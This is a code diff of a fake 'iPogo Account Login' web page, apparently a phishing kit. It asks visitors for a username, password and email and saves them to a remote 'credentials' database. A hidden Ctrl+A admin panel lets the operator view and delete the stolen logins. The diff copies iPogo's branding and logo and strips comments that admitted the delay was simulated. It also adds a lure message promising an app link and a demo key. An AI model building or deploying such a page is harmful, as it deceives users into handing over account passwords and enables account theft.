@@ -4,27 +4,99 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>iPogo Login Portal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
-    body { font-family: Arial, sans-serif; background: #f0f0f0; padding: 20px; }
-    .container { max-width: 500px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-    h2, h3 { text-align: center; color: #e3350d; }
-    .form-group { margin-bottom: 20px; }
-    label { display: block; margin-bottom: 5px; }
-    input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; }
-    .btn { width: 100%; padding: 10px; background: #e3350d; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-    .btn:hover { background: #c12a0b; }
+    body {
+      font-family: 'Rubik', sans-serif;
+      background: linear-gradient(to right, #000000, #1e1e1e);
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      background: #1c1c1c;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 150px;
+    }
+    h2, h3 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #ffcc00;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      background: #333;
+      color: white;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #ffcc00;
+      color: #000;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .btn:hover {
+      background: #e6b800;
+    }
     #emailStep, #adminPanel, #adminAccess { display: none; }
-    .success-msg { text-align: center; color: green; margin-top: 15px; font-weight: bold; }
-    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-    th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
-    th { background: #e3350d; color: white; }
+    .success-msg {
+      text-align: center;
+      color: #80ff80;
+      font-weight: bold;
+      margin-top: 15px;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+    }
+    th, td {
+      padding: 10px;
+      border: 1px solid #444;
+      text-align: left;
+    }
+    th {
+      background: #ffcc00;
+      color: #000;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>Pokémon GO Login</h2>
+    <div class="logo">
+      <img src="https://cdn.ipogo.app/assets/images/iPogo-logo-yellow.svg" alt="iPogo Logo" />
+    </div>
+    <h2>iPogo Account Login</h2>
 
-    <!-- Step 1: Username + Password -->
     <div id="loginStep">
       <div class="form-group">
         <label>Username</label>
@@ -37,7 +109,6 @@
       <button class="btn" onclick="nextStep()">Next</button>
     </div>
 
-    <!-- Step 2: Email -->
     <div id="emailStep">
       <div class="form-group">
         <label>Email</label>
@@ -47,14 +118,12 @@
       <p class="success-msg" id="successMsg"></p>
     </div>
 
-    <!-- Admin Access Trigger (Hidden) -->
     <div id="adminAccess">
       <label><strong>Admin Password:</strong></label>
       <input type="password" id="adminPassword" />
-      <button class="btn" style="margin-top:10px" onclick="checkAdmin()">View Admin Panel</button>
+      <button class="btn" onclick="checkAdmin()">View Admin Panel</button>
     </div>
 
-    <!-- Admin Panel -->
     <div id="adminPanel">
       <h3>Stored Credentials</h3>
       <table>
@@ -63,7 +132,7 @@
         </thead>
         <tbody id="credTable"></tbody>
       </table>
-      <button class="btn" style="background:#555;margin-top:20px" onclick="clearAll()">Delete All</button>
+      <button class="btn" style="background:#555; color:#fff;" onclick="clearAll()">Delete All</button>
     </div>
   </div>
 
@@ -90,7 +159,6 @@
       const pass = document.getElementById('password').value;
       if (!uname || !pass) return alert('Please enter username and password.');
 
-      // Simulate real processing delay
       document.getElementById('loginStep').innerHTML = '<p style="text-align:center">Processing...</p>';
       setTimeout(() => {
         document.getElementById('loginStep').style.display = 'none';
@@ -109,7 +177,7 @@
 
       setTimeout(() => {
         db.ref('credentials').push({ uname, pass, email, time });
-        document.getElementById('successMsg').innerText = 'Thank you! Your email has been submitted and credentials saved.';
+        document.getElementById('successMsg').innerText = '✅ Thank you! The latest app link will be sent to the provided email within 15 minutes along with a 3-day demo key. If you do not receive it, please check your spam folder or contact support.';
       }, 1200);
     }
 
@@ -142,7 +210,6 @@
       }
     }
 
-    // Show admin input box only for you (Ctrl + A)
     window.addEventListener('keydown', (e) => {
       if (e.ctrlKey && e.key === 'A') {
         document.getElementById('adminAccess').style.display = 'block';
